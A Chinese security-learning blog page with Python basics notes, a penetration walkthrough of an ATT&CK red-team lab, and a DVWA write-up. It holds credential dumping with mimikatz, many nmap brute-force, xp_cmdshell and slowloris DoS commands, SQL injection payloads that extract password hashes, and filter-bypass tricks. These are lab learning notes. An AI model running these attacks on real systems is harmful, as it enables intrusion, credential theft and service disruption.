<h3 id="python3基本数据类型"><a href="#python3基本数据类型" class="headerlink" title="python3基本数据类型"></a><strong>python3基本数据类型</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>多个变量赋值</span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">"runoob"</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>Python3 中有六个标准的数据类型：</span><br><span class="line">不可变数据（<span class="number">3</span> 个）：Number（数字）、String（字符串）、Tuple（元组）；</span><br><span class="line">可变数据（<span class="number">3</span> 个）：List（列表）、Dictionary（字典）、Set（集合）。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>数值的除法包含两个运算符：/ 返回一个浮点数，// 返回一个整数。</span><br><span class="line">  在混合计算时，Python会把整型转换成为浮点数。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.L</span>ist</span><br><span class="line">列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）</span><br><span class="line">列表是写在方括号 [] 之间、用逗号分隔开的元素列表</span><br><span class="line">t=[<span class="number">9</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">6</span>]</span><br><span class="line">a[<span class="number">2</span>:<span class="number">5</span>] &gt;&gt;表示 <span class="number">13</span>，<span class="number">14</span> 注意，没有到<span class="number">15</span>，后面是半包含</span><br><span class="line"><span class="number">1</span>、List写在方括号之间，元素用逗号隔开。</span><br><span class="line"><span class="number">2</span>、和字符串一样，list可以被索引和切片。</span><br><span class="line"><span class="number">3</span>、List可以使用+操作符进行拼接。</span><br><span class="line"><span class="number">4</span>、List中的元素是可以改变的。</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverseWords</span><span class="params">(input)</span>:</span></span><br><span class="line">    <span class="comment"># 通过空格将字符串分隔符，把各个单词分隔为列表</span></span><br><span class="line">    inputWords = input.split(<span class="string">" "</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># inputWords[-1::-1] 有三个参数</span></span><br><span class="line">    <span class="comment"># 第二个参数为空，表示移动到列表末尾</span></span><br><span class="line">    inputWords=inputWords[<span class="number">-1</span>::<span class="number">-1</span>]</span><br><span class="line">    <span class="comment"># 重新组合字符串</span></span><br><span class="line">    output = <span class="string">' '</span>.join(inputWords)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    input = <span class="string">'I like runoob'</span></span><br><span class="line">    rw = reverseWords(input)</span><br><span class="line">    print(rw)</span><br><span class="line">&gt;&gt;&gt;runoob like I</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.</span>Tuple（元组）</span><br><span class="line">元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。</span><br><span class="line">元组中的元素类型也可以不相同：</span><br><span class="line">tup1 = ()    <span class="comment"># 空元组</span></span><br><span class="line">tup2 = (<span class="number">20</span>,) <span class="comment"># 一个元素，需要在元素后添加逗号</span></span><br><span class="line">虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>Set（集合）</span><br><span class="line">集合（set）是由一个或数个形态各异的大小整体组成的，构成集合的事物或对象称作元素或是成员。</span><br><span class="line"><span class="comment">######基本功能是进行成员关系测试   和    删除重复元素。</span></span><br><span class="line">可以使用大括号 &#123; &#125; 或者 set() 函数创建集合，注意：创建一个空集合必须用 set() 而不是 &#123; &#125;，因为 &#123; &#125; 是用来创建一个空字典。</span><br><span class="line">创建格式：</span><br><span class="line">parame = &#123;value01,value02,...&#125;</span><br><span class="line">或者</span><br><span class="line">set(value)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = set(<span class="string">'abracadabra'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a)</span><br><span class="line">&#123;<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'r'</span>&#125;</span><br><span class="line">a = set(<span class="string">'abracadabra'</span>)</span><br><span class="line">b = set(<span class="string">'alacazam'</span>)</span><br><span class="line">print(a - b)     <span class="comment"># a 和 b 的差集</span></span><br><span class="line">print(a | b)     <span class="comment"># a 和 b 的并集</span></span><br><span class="line">print(a &amp; b)     <span class="comment"># a 和 b 的交集</span></span><br><span class="line">print(a ^ b)     <span class="comment"># a 和 b 中不同时存在的元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7.</span>Dictionary（字典）</span><br><span class="line">列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：</span><br><span class="line"><span class="comment">#字典当中的元素是通过键来存取的，而不是通过偏移存取。</span></span><br><span class="line">字典是一种映射类型，字典用 &#123; &#125; 标识，它是一个无序的 键(key) : 值(value) 的集合。</span><br><span class="line"><span class="comment">#键(key)必须使用不可变类型。</span></span><br><span class="line"><span class="comment">#在同一个字典中，键(key)必须是唯一的。</span></span><br><span class="line"><span class="number">1</span>、字典是一种映射类型，它的元素是键值对。</span><br><span class="line"><span class="number">2</span>、字典的关键字必须为不可变类型，且不能重复。</span><br><span class="line"><span class="number">3</span>、创建空字典使用 &#123; &#125;。</span><br><span class="line"></span><br><span class="line">构造函数 dict() 可以直接从键值对序列中构建字典如下：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict(Runoob=<span class="number">1</span>, Google=<span class="number">2</span>, Taobao=<span class="number">3</span>)</span><br><span class="line">&#123;<span class="string">'Runoob'</span>: <span class="number">1</span>, <span class="string">'Google'</span>: <span class="number">2</span>, <span class="string">'Taobao'</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dict([(<span class="string">'Runoob'</span>, <span class="number">1</span>), (<span class="string">'Google'</span>, <span class="number">2</span>), (<span class="string">'Taobao'</span>, <span class="number">3</span>)])</span><br><span class="line">&#123;<span class="string">'Runoob'</span>: <span class="number">1</span>, <span class="string">'Google'</span>: <span class="number">2</span>, <span class="string">'Taobao'</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left"><strong>函数</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-int.html" target="_blank" rel="noopener">int(x [,base])</a></strong></td>
<td align="left"><strong>将x转换为一个整数</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-float.html" target="_blank" rel="noopener">float(x)</a></strong></td>
<td align="left"><strong>将x转换到一个浮点数</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-complex.html" target="_blank" rel="noopener">complex(real [,imag])</a></strong></td>
<td align="left"><strong>创建一个复数</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-str.html" target="_blank" rel="noopener">str(x)</a></strong></td>
<td align="left"><strong>将对象 x 转换为字符串</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-repr.html" target="_blank" rel="noopener">repr(x)</a></strong></td>
<td align="left"><strong>将对象 x 转换为表达式字符串</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-eval.html" target="_blank" rel="noopener">eval(str)</a></strong></td>
<td align="left"><strong>用来计算在字符串中的有效Python表达式,并返回一个对象</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python3-func-tuple.html" target="_blank" rel="noopener">tuple(s)</a></strong></td>
<td align="left"><strong>将序列 s 转换为一个元组</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python3-att-list-list.html" target="_blank" rel="noopener">list(s)</a></strong></td>
<td align="left"><strong>将序列 s 转换为一个列表</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-set.html" target="_blank" rel="noopener">set(s)</a></strong></td>
<td align="left"><strong>转换为可变集合</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-dict.html" target="_blank" rel="noopener">dict(d)</a></strong></td>
<td align="left"><strong>创建一个字典。d 必须是一个 (key, value)元组序列。</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-frozenset.html" target="_blank" rel="noopener">frozenset(s)</a></strong></td>
<td align="left"><strong>转换为不可变集合</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-chr.html" target="_blank" rel="noopener">chr(x)</a></strong></td>
<td align="left"><strong>将一个整数转换为一个字符</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-ord.html" target="_blank" rel="noopener">ord(x)</a></strong></td>
<td align="left"><strong>将一个字符转换为它的整数值</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-hex.html" target="_blank" rel="noopener">hex(x)</a></strong></td>
<td align="left"><strong>将一个整数转换为一个十六进制字符串</strong></td>
</tr>
<tr>
<td align="left"><strong><a href="https://www.runoob.com/python3/python-func-oct.html" target="_blank" rel="noopener">oct(x)</a></strong></td>
<td align="left"><strong>将一个整数转换为一个八进制字符串</strong></td>
</tr>
</tbody></table>
<h2 id="python模块介绍"><a href="#python模块介绍" class="headerlink" title="python模块介绍"></a>python模块介绍</h2><h3 id="getopt模块"><a href="#getopt模块" class="headerlink" title="getopt模块"></a><strong>getopt模块</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opts, args &#x3D; getopt.getopt(sys.argv[1:],&quot;hle:t:p:cu:&quot;, [&quot;help&quot;,&quot;listen&quot;,&quot;execute&quot;,&quot;target&quot;,&quot;port&quot;,&quot;command&quot;,&quot;upload&quot;])</span><br></pre></td></tr></table></figure>

<p>1.处理所使用的函数叫<strong>getopt()</strong>，因为是<strong>直接使用import导入的getopt模块</strong>，所以<strong>要加上限定getopt</strong>才可以</p>
<p>2.hl、c表示开关选项<strong>，后面无需参数，而e：、t：则表</strong>示后面应该带一个参数</p>
<p>3.函数返回两个列表：<strong>opts和args</strong>。opts为分析出的格式信息。<strong>args为不属于格式信息的剩余的命令行参数,即不是按照getopt(）里面定义的长或短选项字符和附加参数以外的信息</strong>。<strong>opts是一个两元组的列表。每个元素为：(选项串,附加参数)。如果没有附加参数则为空串’’</strong>。举个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test1.py &#39;-h -o file --help --output&#x3D;out file1 file2&#39;</span><br></pre></td></tr></table></figure>

<p>opts的输出结果为：[(‘-h’, ‘’), (‘-o’, ‘file’), (‘–help’, ‘’), (‘–output’, ‘out’)]</p>
<p>而args则为：[‘file1’, ‘file2’]，这就是<strong>不属于格式信息的剩余的命令行参数。</strong></p>
<p>从opts中取出一个两元组，赋给两个变量。<strong>o保存选项参数，a为附加参数</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">       <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">"-h"</span>,<span class="string">"--help"</span>):</span><br><span class="line">           usage()</span><br><span class="line">       <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-l"</span>,<span class="string">"--listen"</span>):</span><br><span class="line">           listen = <span class="literal">True</span></span><br><span class="line">       <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-e"</span>, <span class="string">"--execute"</span>):</span><br><span class="line">           execute = a</span><br><span class="line">       <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">"-c"</span>, <span class="string">"--commandshell"</span>):</span><br><span class="line">           command = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h3><p>subprocess的<strong>run、call、check_call、check_output函数</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#若执行成功，则函数返回值为命令输出结果；若执行失败，则抛出异常</span></span><br><span class="line">output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>


      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-常见渗透工具的使用" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"
    >内网渗透</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/02/%E5%B8%B8%E8%A7%81%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
  <time datetime="2020-04-02T13:26:08.000Z" itemprop="datePublished">2020-04-02</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>以ATT&amp;CK实战系列——红队实战(一)靶场，来介绍下内网渗透的基本操作流程</p>
<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a><strong>1.信息收集</strong></h3><p>为了更方便利用，将shell从蚁剑转移到cs上，在cs上生成后门文件，上传至目标靶机并执行，cs显示靶机已上线</p>
<p>用<strong>hashdump、mimikatz</strong>抓取密码，还可以检测到主机所属域是GOD</p>
<p><strong>net config Workstation (当前计算机名，全名，用户名，系统版本，工作站域，登陆域)</strong></p>
<p>可以得到<strong>域DNS名称为 god.org</strong></p>
<p><strong>net localgroup administrators 本机管理员[通常含有域用户]</strong></p>
<p><strong>net view 查看局域网内所有计算机</strong> —-发现win7主机局域网内还存在两台主机</p>
<p><strong>systeminfo 查看系统信息·</strong>··············</p>
<p><strong>使用CS扩展的Ladon插件探测内网存活主机情况</strong></p>
<p><strong>net view /domain 查看域情况</strong></p>
<p>（1）  nmap –script=auth 192.168.137.*</p>
<p>  　　负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</p>
<p>  　　（2）nmap –script=brute 192.168.137.*</p>
<p>  　　提供暴力破解的方式  可对 数据库，smb，snmp等进行简单密码的暴力猜解</p>
<p>  　　（3）nmap –script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</p>
<p>  　　默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</p>
<p>  　　（4）nmap –script=vuln 192.168.137.*</p>
<p>  　　检查是否存在常见漏洞</p>
<p>  　　（5）nmap -n -p445 –script=broadcast 192.168.137.4</p>
<p>  　　在局域网内探查更多服务开启状况</p>
<p>  　 　检查vnc bypass</p>
<p>  　　nmap  –script=realvnc-auth-bypass 192.168.137.4</p>
<p>  　　(1)检查vnc认证方式</p>
<p>  　　nmap  –script=vnc-auth  192.168.137.4</p>
<p>  　　获取vnc信息</p>
<p>  　　nmap  –script=vnc-info  192.168.137.4</p>
<p>  　　（2）smb扫描：</p>
<p>  　　smb破解</p>
<p>  　　nmap  –script=smb-brute.nse 192.168.137.4</p>
<p>  　　smb字典破解</p>
<p>  　　nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p>
<p>  　　smb已知几个严重漏</p>
<p>  　　nmap  –script=smb-check-vulns.nse –script-args=unsafe=1 192.168.137.4</p>
<p>  　　查看共享目录</p>
<p>  　　nmap -p 445  –script smb-ls –script-args ‘share=e$,path=,smbuser=test,smbpass=test’ 192.168.137.4</p>
<p>  　　查看会话</p>
<p>  　　nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p>
<p>  　　系统信息</p>
<p>  　　nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p>
<p>  　　（3）Mssql扫描：</p>
<p>  　　猜解mssql用户名和密码</p>
<p>  　　nmap -p1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p>
<p>  　　xp_cmdshell 执行命令</p>
<p>  　　nmap -p 1433 –script ms-sql-xp-cmdshell –script-args  mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user”  192.168.137.4</p>
<p>  　　（4）dumphash值</p>
<p>  　　nmap -p 1433 –script ms-sql-dump-hashes.nse –script-args mssql.username=sa,mssql.password=sa  192.168.137.4</p>
<p>  　　扫描root空口令</p>
<p>  　　nmap -p3306 –script=mysql-empty-password.nse 192.168.137.4</p>
<p>  　　列出所有mysql用户</p>
<p>  　　nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root 192.168.137.4</p>
<p>  　　（5） Oracle扫描：</p>
<p>  　　oracle sid扫描</p>
<p>  　　nmap –script=oracle-sid-brute -p 1521-1560 192.168.137.5</p>
<p>  　　oracle弱口令破解</p>
<p>  　　nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5</p>
<p>  　　（6）其他一些比较好用的脚本</p>
<p>  　　nmap –script=broadcast-netbios-master-browser 192.168.137.4  发现网关</p>
<p>  　　nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.137.4  破解rsync</p>
<p>  　　nmap –script informix-brute -p 9088 192.168.137.4   informix数据库破解</p>
<p>  　　nmap -p 5432 –script pgsql-brute 192.168.137.4    pgsql破解</p>
<p>  　　nmap -sU –script snmp-brute 192.168.137.4       snmp破解</p>
<p>  　　nmap -sV –script=telnet-brute 192.168.137.4      telnet破解</p>
<p>  　　nmap –script=http-vuln-cve2010-0738 –script-args  ‘http-vuln-cve2010-0738.paths={/path1/,/path2/}’ <target>  jboss  autopwn</target></p>
<p>  　　nmap –script=http-methods.nse 192.168.137.4 检查http方法</p>
<p>  　　nmap –script http-slowloris –max-parallelism 400 192.168.137.4  dos攻击，对于处理能力较小的站点还挺好用的 ‘half-HTTP’ connections</p>
<p>  　　nmap –script=samba-vuln-cve-2012-1182  -p 139 192.168.137.4</p>
<p>  　　nmap –script=smb-brute –script-args=userdb=/tmp/帐号字典.txt,passdb=/tmp/密码字典.txt IP地址 -p 445</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-DVWA" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/02/DVWA/"
    >DVWA</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/02/DVWA/" class="article-date">
  <time datetime="2020-04-02T06:36:59.000Z" itemprop="datePublished">2020-04-02</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a><strong>SQL Injection</strong></h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a><strong>low</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">&#x2F;&#x2F;输出如下</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: guestbook</span><br><span class="line">ID: 1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆users的列</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: user</span><br><span class="line">ID: 1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">First name: 1</span><br><span class="line">Surname: password</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;爆user列和password列的字段内容</span><br><span class="line">1&#39; union select 1,concat(user,password) from users#</span><br></pre></td></tr></table></figure>

<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a><strong>medium</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接爆数据库名和表名                                         末尾加  &amp;&amp;Submit=Submit</span></span><br><span class="line">id=<span class="number">1</span> union select database(),table_name from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br><span class="line"><span class="comment">//查询用户名和对应的密码</span></span><br><span class="line">id=<span class="number">1</span> union select concat(user),concat(password)  from users <span class="comment">##&amp;&amp;Submit=Submit</span></span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a><strong>high</strong></h3><p>不是很懂这里后面加了limit1 有什么用，注释掉就好了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: id=<span class="number">1</span><span class="string">'  union select concat(user),concat(password)  from users #</span></span><br><span class="line"><span class="string">First name: admin</span></span><br><span class="line"><span class="string">Surname: 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p>这个就很有意思了，新手很值得学习，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':id'</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">'first_name'</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">'last_name'</span> ];</span><br></pre></td></tr></table></figure>

<p>引用<a href="https://blog.csdn.net/qq_45555226/article/details/102884030" target="_blank" rel="noopener">大佬</a>的一张图可以很直观的看到从low到impossible级别所加的防御机制</p>
<img src="/2020/04/02/DVWA/1.png" style="zoom: 67%;">

<p>一般来讲，<strong>is_numeric()</strong> 可以利用16进制绕过，比如 1 or 1=1  &gt;&gt;0x314f52313d31</p>
<p>可以考虑采用<strong>正则表达式</strong>的方法来取代is_numberic函数</p>
<p>一、如果发现一个url可能是注入点之后我们可以尝试手注，但是一般的网站都会过滤一些字符串。</p>
<p>在^没有被过滤的时候可以利用它来测试</p>
<p>异或：xor或^</p>
<p>逻辑运算就是：同真异假（两个条件结果相同就为真，结果不同就为假）</p>
<p>例如：1^0 就是 1 ，1^1 就是 0</p>
<p>例如：?id=1’ ^ (length(‘union’)!=0)–+</p>
<p>如果union被过滤，则后面条件的结果就是假的，前面也是假的，url返回正确</p>
<p>如果union没有被过滤，则后面的条件的结果就是真的，而前面是假的，url返回错误</p>
<p>也可以是?id=1’ ^ (length(‘union’)=5)–+</p>
<p>二、简单的sql绕过</p>
<p>基本关键字：括号、空格、引号、#、=、+、and、or、order、select、union、update、inster、into、delete、outfile……</p>
<p>一些绕过的方法：</p>
<p>1、 大小写混写</p>
<p>2、 使用url编码替换字符 ‘ %27，# %23</p>
<p>3、 十六进制绕过 where=“user” where=0x7573657273</p>
<p>4、使用&amp;&amp; || 代替and or</p>
<p>5、双写关键字 aandnd</p>
<p>6、绕过空格：用tab键代替空格</p>
<p>用回车chr(13)&amp;chr(10)，url编码的形式%0d%0a</p>
<p>用括号 id=1(and)1=1</p>
<p>7、=用like、rlike、等代替</p>
<p>8、使用/<strong>/注释符来，重组关键字 un/</strong>/i/**/on</p>
<p>9、注释负：//，– , /**/, #, –+, – -, ;,%00,–a</p>
<p>如果是使用gbk的网页编码的网站也可以利用宽字节来绕过 </p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br></pre></td></tr></table></figure>

